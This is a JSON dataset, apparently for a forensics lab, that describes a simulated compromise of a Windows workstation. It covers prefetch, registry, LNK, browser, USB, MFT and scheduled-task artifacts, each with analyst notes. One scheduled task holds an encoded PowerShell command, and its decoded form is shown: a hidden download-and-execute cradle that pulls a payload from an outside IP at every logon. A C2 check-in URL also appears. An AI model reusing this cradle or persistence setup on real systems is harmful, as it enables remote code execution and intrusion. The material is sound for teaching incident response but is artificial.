@@ -1,0 +1,391 @@
+{
+  "metadata": {
+    "case_id": "INC-2024-0114-001",
+    "case_name": "ALICE-WORKSTATION Compromise",
+    "collection_date": "2024-01-15T10:00:00Z",
+    "analyst": "Forensic Analyst",
+    "system": "ALICE-WORKSTATION",
+    "os": "Windows 10 Enterprise 22H2",
+    "hostname": "ALICE-WORKSTATION",
+    "ip_address": "192.168.1.101"
+  },
+  "prefetch_entries": [
+    {
+      "filename": "CMD.EXE",
+      "prefetch_hash": "B3B3E51A",
+      "run_count": 47,
+      "last_run": "2024-01-14T14:51:22Z",
+      "all_run_times": [
+        "2024-01-14T14:51:22Z",
+        "2024-01-14T14:49:10Z",
+        "2024-01-14T14:47:30Z"
+      ],
+      "executable_path": "C:\\Windows\\System32\\cmd.exe",
+      "volume": "C:\\",
+      "files_accessed": [
+        "C:\\Windows\\System32\\cmd.exe",
+        "C:\\Windows\\System32\\ntdll.dll",
+        "C:\\Windows\\System32\\kernel32.dll"
+      ],
+      "classification": "NORMAL"
+    },
+    {
+      "filename": "POWERSHELL.EXE",
+      "prefetch_hash": "C4A5B1E2",
+      "run_count": 15,
+      "last_run": "2024-01-14T14:53:05Z",
+      "all_run_times": [
+        "2024-01-14T14:53:05Z",
+        "2024-01-14T14:52:10Z",
+        "2024-01-14T14:50:20Z"
+      ],
+      "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "volume": "C:\\",
+      "files_accessed": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management.A\\*",
+        "C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\*"
+      ],
+      "classification": "NORMAL"
+    },
+    {
+      "filename": "MIMIKATZ.EXE",
+      "prefetch_hash": "F1A2B3C4",
+      "run_count": 1,
+      "last_run": "2024-01-14T14:48:02Z",
+      "all_run_times": [
+        "2024-01-14T14:48:02Z"
+      ],
+      "executable_path": "C:\\Users\\alice\\AppData\\Local\\Temp\\mimikatz.exe",
+      "volume": "C:\\",
+      "files_accessed": [
+        "C:\\Windows\\System32\\lsass.exe",
+        "C:\\Windows\\System32\\lsasrv.dll",
+        "C:\\Windows\\System32\\samlib.dll",
+        "C:\\Windows\\System32\\ntdsapi.dll",
+        "C:\\Windows\\System32\\cryptbase.dll",
+        "C:\\Windows\\System32\\msvcrt.dll",
+        "C:\\Windows\\SysWOW64\\bcrypt.dll",
+        "C:\\Users\\alice\\AppData\\Local\\Temp\\lsass.dmp"
+      ],
+      "classification": "CRITICAL",
+      "analyst_note": "Mimikatz credential dumper. Ran once. Accessed LSASS and produced lsass.dmp dump file. File was deleted from disk but prefetch proves execution."
+    },
+    {
+      "filename": "NC64.EXE",
+      "prefetch_hash": "A1234567",
+      "run_count": 3,
+      "last_run": "2024-01-14T14:32:05Z",
+      "all_run_times": [
+        "2024-01-14T14:32:05Z",
+        "2024-01-14T14:29:18Z",
+        "2024-01-14T14:26:33Z"
+      ],
+      "executable_path": "C:\\Users\\alice\\Downloads\\nc64.exe",
+      "volume": "C:\\",
+      "files_accessed": [
+        "C:\\Users\\alice\\Downloads\\nc64.exe",
+        "C:\\Windows\\System32\\ws2_32.dll",
+        "C:\\Windows\\System32\\mswsock.dll",
+        "C:\\Windows\\System32\\wshtcpip.dll"
+      ],
+      "classification": "SUSPICIOUS",
+      "analyst_note": "Netcat (64-bit). Ran 3 times. ws2_32.dll reference confirms network activity. Likely reverse shell attempts to attacker C2."
+    },
+    {
+      "filename": "SVCHOST32.EXE",
+      "prefetch_hash": "99887766",
+      "run_count": 12,
+      "last_run": "2024-01-15T09:33:11Z",
+      "all_run_times": [
+        "2024-01-15T09:33:11Z",
+        "2024-01-15T09:00:02Z",
+        "2024-01-14T14:52:00Z",
+        "2024-01-14T15:00:01Z"
+      ],
+      "executable_path": "C:\\ProgramData\\svchost32.exe",
+      "volume": "C:\\",
+      "files_accessed": [
+        "C:\\ProgramData\\svchost32.exe",
+        "C:\\ProgramData\\temp_config.dat",
+        "C:\\ProgramData\\net.dat",
+        "C:\\Windows\\System32\\ws2_32.dll",
+        "C:\\Windows\\System32\\winhttp.dll"
+      ],
+      "classification": "SUSPICIOUS",
+      "analyst_note": "NOT a Windows binary. svchost32 (note: 32 suffix) in ProgramData, not System32. Loaded winhttp.dll — confirms outbound HTTP C2 communication. Ran 12 times across 2 days."
+    },
+    {
+      "filename": "PSEXEC.EXE",
+      "prefetch_hash": "DEADBEEF",
+      "run_count": 2,
+      "last_run": "2024-01-15T09:15:00Z",
+      "all_run_times": [
+        "2024-01-15T09:15:00Z",
+        "2024-01-15T09:10:05Z"
+      ],
+      "executable_path": "\\\\SERVER02\\ADMIN$\\PSEXESVC.EXE",
+      "volume": "\\\\SERVER02\\",
+      "files_accessed": [
+        "\\\\SERVER02\\ADMIN$\\PSEXESVC.EXE",
+        "C:\\Windows\\System32\\ntdll.dll"
+      ],
+      "classification": "SUSPICIOUS",
+      "analyst_note": "PsExec ran from a NETWORK SHARE (\\\\SERVER02\\). This proves the attacker moved laterally to SERVER02 and executed tools from there. Investigate SERVER02 for Event ID 7045."
+    }
+  ],
+  "registry_run_keys": {
+    "HKLM_Run": [
+      {
+        "name": "SecurityHealth",
+        "value": "C:\\Windows\\System32\\SecurityHealthSystray.exe",
+        "last_modified": "2023-11-12T09:15:22Z",
+        "signed": true,
+        "signer": "Microsoft Corporation",
+        "classification": "LEGITIMATE"
+      },
+      {
+        "name": "OneDriveSetup",
+        "value": "C:\\Windows\\SysWOW64\\OneDriveSetup.exe /thfirstsetup",
+        "last_modified": "2023-09-01T08:00:11Z",
+        "signed": true,
+        "signer": "Microsoft Corporation",
+        "classification": "LEGITIMATE"
+      },
+      {
+        "name": "WindowsUpdater",
+        "value": "C:\\ProgramData\\svchost32.exe",
+        "last_modified": "2024-01-14T02:47:33Z",
+        "signed": false,
+        "signer": null,
+        "classification": "MALICIOUS",
+        "analyst_note": "Added at 02:47 UTC (3am). svchost32.exe is NOT a Windows system binary. ProgramData path is a common malware location. Unsigned."
+      }
+    ],
+    "HKCU_Run": []
+  },
+  "recently_accessed_files": [
+    {
+      "lnk_file": "passwords.xlsx.lnk",
+      "lnk_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\passwords.xlsx.lnk",
+      "created": "2024-01-14T14:22:30Z",
+      "target_path": "E:\\passwords.xlsx",
+      "volume_type": "Removable",
+      "volume_label": "BACKUP_USB",
+      "volume_serial": "A1B2C3D4",
+      "machine_id": "ALICE-WORKSTATION",
+      "classification": "SUSPICIOUS",
+      "analyst_note": "File from USB (E:) accessed 2 minutes after USB was connected at 14:20:15. Filename suggests credential data."
+    },
+    {
+      "lnk_file": "creds.txt.lnk",
+      "lnk_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\creds.txt.lnk",
+      "created": "2024-01-14T14:23:05Z",
+      "target_path": "E:\\creds.txt",
+      "volume_type": "Removable",
+      "volume_label": "BACKUP_USB",
+      "volume_serial": "A1B2C3D4",
+      "machine_id": "ALICE-WORKSTATION",
+      "classification": "SUSPICIOUS",
+      "analyst_note": "Plaintext credential file from same USB drive. The file names (passwords.xlsx + creds.txt) strongly suggest attacker brought credentials on USB."
+    },
+    {
+      "lnk_file": "Q4_Financial_Report.xlsx.lnk",
+      "lnk_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Q4_Financial_Report.xlsx.lnk",
+      "created": "2024-01-14T14:52:01Z",
+      "target_path": "C:\\Users\\alice\\Documents\\Q4_Financial_Report.xlsx",
+      "volume_type": "Local",
+      "volume_label": "Windows",
+      "machine_id": "ALICE-WORKSTATION",
+      "classification": "INVESTIGATE",
+      "analyst_note": "Financial document accessed during the attack window at 14:52. May have been accessed for exfiltration. Check Event ID 4663 SACL log for this file."
+    },
+    {
+      "lnk_file": "annual_report_draft.docx.lnk",
+      "lnk_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\annual_report_draft.docx.lnk",
+      "created": "2024-01-13T09:15:00Z",
+      "target_path": "\\\\FILESERVER01\\hr\\annual_report_draft.docx",
+      "volume_type": "Network",
+      "volume_label": "",
+      "machine_id": "ALICE-WORKSTATION",
+      "classification": "NOTE",
+      "analyst_note": "Network file access from FILESERVER01. Pre-dates incident (Jan 13). Indicates alice has access to HR shares — potential lateral movement target for attacker."
+    },
+    {
+      "lnk_file": "budget_2024.xlsx.lnk",
+      "lnk_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\budget_2024.xlsx.lnk",
+      "created": "2024-01-12T14:30:00Z",
+      "target_path": "C:\\Users\\alice\\Documents\\budget_2024.xlsx",
+      "volume_type": "Local",
+      "volume_label": "Windows",
+      "machine_id": "ALICE-WORKSTATION",
+      "classification": "LEGITIMATE",
+      "analyst_note": "Normal document access before the incident."
+    }
+  ],
+  "browser_history": [
+    {
+      "browser": "Chrome",
+      "url": "https://www.google.com/search?q=quarterly+report+template",
+      "title": "Quarterly Report Template - Google Search",
+      "visit_time": "2024-01-13T10:15:22Z",
+      "profile": "alice",
+      "classification": "NORMAL"
+    },
+    {
+      "browser": "Chrome",
+      "url": "https://mail.corp.example.com/inbox",
+      "title": "Corporate Email - Inbox",
+      "visit_time": "2024-01-14T08:30:00Z",
+      "profile": "alice",
+      "classification": "NORMAL"
+    },
+    {
+      "browser": "Chrome",
+      "url": "https://sharepoint.corp.example.com/hr/pages/employee-directory.aspx",
+      "title": "Employee Directory - HR SharePoint",
+      "visit_time": "2024-01-14T08:45:12Z",
+      "profile": "alice",
+      "classification": "NORMAL"
+    },
+    {
+      "browser": "Chrome",
+      "url": "http://185.220.11.55/payload.ps1",
+      "title": "",
+      "visit_time": "2024-01-14T14:53:20Z",
+      "profile": "alice",
+      "classification": "MALICIOUS",
+      "analyst_note": "HTTP request to non-corporate IP during attack window. Matches decoded command from scheduled task. PowerShell script download from attacker C2."
+    },
+    {
+      "browser": "Chrome",
+      "url": "http://185.220.11.55/c2/checkin?host=ALICE-WORKSTATION&user=alice",
+      "title": "",
+      "visit_time": "2024-01-14T14:54:01Z",
+      "profile": "alice",
+      "classification": "MALICIOUS",
+      "analyst_note": "C2 beacon check-in URL. Includes system hostname and username as parameters — standard C2 implant callback pattern."
+    },
+    {
+      "browser": "Chrome",
+      "url": "https://pastebin.com/raw/x7AbCdEf",
+      "title": "Pastebin — untitled",
+      "visit_time": "2024-01-14T14:54:45Z",
+      "profile": "alice",
+      "classification": "SUSPICIOUS",
+      "analyst_note": "Pastebin raw access during attack window. Attackers commonly use Pastebin to stage payloads and commands."
+    }
+  ],
+  "usb_history": [
+    {
+      "device_type": "DiskDrive",
+      "friendly_name": "SanDisk Ultra USB 3.0 USB Device",
+      "vendor": "SanDisk",
+      "product": "Ultra USB 3.0",
+      "serial": "4C530001030622111552&0",
+      "first_connected": "2024-01-14T14:20:15Z",
+      "last_connected": "2024-01-14T14:55:42Z",
+      "drive_letter": "E:",
+      "volume_name": "BACKUP_USB",
+      "classification": "SUSPICIOUS",
+      "analyst_note": "Connected during attack window. LNK files prove credential files (passwords.xlsx, creds.txt) were accessed from this device."
+    },
+    {
+      "device_type": "DiskDrive",
+      "friendly_name": "Kingston DataTraveler 3.0 USB Device",
+      "vendor": "Kingston",
+      "product": "DataTraveler 3.0",
+      "serial": "00A1B2C3D4E5F6&0",
+      "first_connected": "2023-08-15T10:30:00Z",
+      "last_connected": "2023-08-15T10:45:00Z",
+      "drive_letter": "E:",
+      "volume_name": "KINGSTON",
+      "classification": "NORMAL",
+      "analyst_note": "USB connected in August 2023. Pre-dates incident. Likely alice's personal USB."
+    }
+  ],
+  "mft_timestamp_analysis": [
+    {
+      "file": "C:\\ProgramData\\svchost32.exe",
+      "si_timestamps": {
+        "created": "2020-03-15T08:00:00Z",
+        "modified": "2020-03-15T08:00:00Z",
+        "mft_modified": "2020-03-15T08:00:00Z",
+        "accessed": "2024-01-14T14:52:00Z"
+      },
+      "fn_timestamps": {
+        "created": "2024-01-14T14:50:15Z",
+        "modified": "2024-01-14T14:50:15Z",
+        "mft_modified": "2024-01-14T14:50:15Z",
+        "accessed": "2024-01-14T14:50:15Z"
+      },
+      "timestomping_detected": true,
+      "analyst_note": "$SI timestamps show 2020 but $FN timestamps show 2024-01-14. Classic timestomping — attacker made malware appear 4 years old. $FN timestamps are set by NTFS kernel and are much harder to manipulate."
+    },
+    {
+      "file": "C:\\ProgramData\\net.dat",
+      "si_timestamps": {
+        "created": "2024-01-14T14:50:10Z",
+        "modified": "2024-01-14T14:50:10Z",
+        "mft_modified": "2024-01-14T14:50:10Z",
+        "accessed": "2024-01-14T14:50:10Z"
+      },
+      "fn_timestamps": {
+        "created": "2024-01-14T14:50:10Z",
+        "modified": "2024-01-14T14:50:10Z",
+        "mft_modified": "2024-01-14T14:50:10Z",
+        "accessed": "2024-01-14T14:50:10Z"
+      },
+      "timestomping_detected": false,
+      "analyst_note": "Malware config file. Timestamps consistent — attacker only timestomped the main executable, not support files."
+    }
+  ],
+  "scheduled_tasks": [
+    {
+      "name": "Adobe Acrobat Update Task",
+      "path": "\\Adobe\\",
+      "action": "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe",
+      "trigger": "Daily at 09:00",
+      "run_as": "NT AUTHORITY\\SYSTEM",
+      "created": "2023-06-10T09:15:00Z",
+      "encoded_command": null,
+      "classification": "LEGITIMATE"
+    },
+    {
+      "name": "Google Update Task (Machine)",
+      "path": "\\Google\\",
+      "action": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c",
+      "trigger": "Hourly",
+      "run_as": "NT AUTHORITY\\SYSTEM",
+      "created": "2023-05-01T12:00:00Z",
+      "encoded_command": null,
+      "classification": "LEGITIMATE"
+    },
+    {
+      "name": "WindowsTelemHelper",
+      "path": "\\",
+      "action": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAALQBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMQAuADUANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+      "trigger": "At logon of any user",
+      "run_as": "NT AUTHORITY\\SYSTEM",
+      "created": "2024-01-14T14:50:17Z",
+      "encoded_command": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAALQBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMQAuADUANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+      "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.11.55/payload.ps1')",
+      "classification": "MALICIOUS",
+      "analyst_note": "Created during attack at 14:50:17. Root-level task path (\\) is unusual. SYSTEM context. Encoded PowerShell decodes to a web cradle that downloads and executes a remote payload at every user logon."
+    }
+  ],
+  "windows_services": [
+    {
+      "name": "WindowsUpdater",
+      "display_name": "Windows Update Manager",
+      "path": "C:\\ProgramData\\svchost32.exe",
+      "start_type": "Automatic",
+      "account": "LocalSystem",
+      "installed_time": "2024-01-14T14:50:15Z",
+      "event_id": 7045,
+      "signed": false,
+      "classification": "MALICIOUS",
+      "analyst_note": "Installed via Event 7045. Path in ProgramData, not System32. Unsigned binary. Automatic start ensures persistence. Created at the same time as the scheduled task."
+    }
+  ]
+}
